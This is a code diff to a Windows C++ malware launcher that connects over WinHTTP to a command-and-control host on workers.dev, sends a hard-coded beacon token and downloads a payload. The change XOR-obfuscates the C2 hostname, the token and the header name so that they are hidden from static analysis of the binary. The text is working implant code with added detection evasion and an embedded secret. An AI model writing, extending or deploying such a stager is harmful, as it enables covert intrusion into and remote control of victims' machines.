@@ -29,17 +29,30 @@
 #include <winhttp.h>
 #include <string>
 #include <vector>
+#include "obfuscate.hpp"
 #include <algorithm>
 
 // ---------------------------------------------------------------------------
 // *** CONFIGURE THESE BEFORE BUILDING ***
 // ---------------------------------------------------------------------------
 
-static const wchar_t* LAUNCHER_C2_HOST      = L"ghost-c2.sujallamichhane.workers.dev";
-// *** THIS VALUE MUST MATCH the Worker's BEACON_TOKEN secret exactly ***
-// Set it with: wrangler secret put BEACON_TOKEN  (in the worker/ directory)
-// Then paste this same value when prompted, or the launcher will get HTTP 401.
-static const wchar_t* LAUNCHER_BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
+// C2 config — stored XOR-obfuscated via XSW, decrypted only at runtime
+static std::wstring GetLauncherC2Host() {
+    static wchar_t buf[64] = {};
+    if (!buf[0]) {
+        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
+        wcsncpy_s(buf, s.str(), _TRUNCATE);
+    }
+    return buf;
+}
+static std::wstring GetLauncherToken() {
+    static wchar_t buf[65] = {};
+    if (!buf[0]) {
+        auto s = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
+        wcsncpy_s(buf, s.str(), _TRUNCATE);
+    }
+    return buf;
+}
 
 // ---------------------------------------------------------------------------
 // Tunables
@@ -191,7 +204,8 @@ static BOOL HttpGet(std::vector<BYTE>& payload) {
     WinHttpSetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,       &timeout, sizeof(timeout));
     WinHttpSetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT,    &timeout, sizeof(timeout));
 
-    h.connect = WinHttpConnect(h.session, LAUNCHER_C2_HOST, C2_PORT, 0);
+    std::wstring c2host = GetLauncherC2Host();
+    h.connect = WinHttpConnect(h.session, c2host.c_str(), C2_PORT, 0);
     if (!h.connect) return FALSE;
 
     h.request = WinHttpOpenRequest(
@@ -204,8 +218,9 @@ static BOOL HttpGet(std::vector<BYTE>& payload) {
     );
     if (!h.request) return FALSE;
 
-    // Auth header
-    std::wstring auth = std::wstring(L"X-Beacon-Token: ") + LAUNCHER_BEACON_TOKEN + L"\r\n";
+    // Auth header — XSW so header name is not plaintext in binary
+    auto hdrName = XSW(L"X-Beacon-Token: ");
+    std::wstring auth = std::wstring(hdrName.str()) + GetLauncherToken() + L"\r\n";
     WinHttpAddRequestHeaders(
         h.request,
         auth.c_str(),
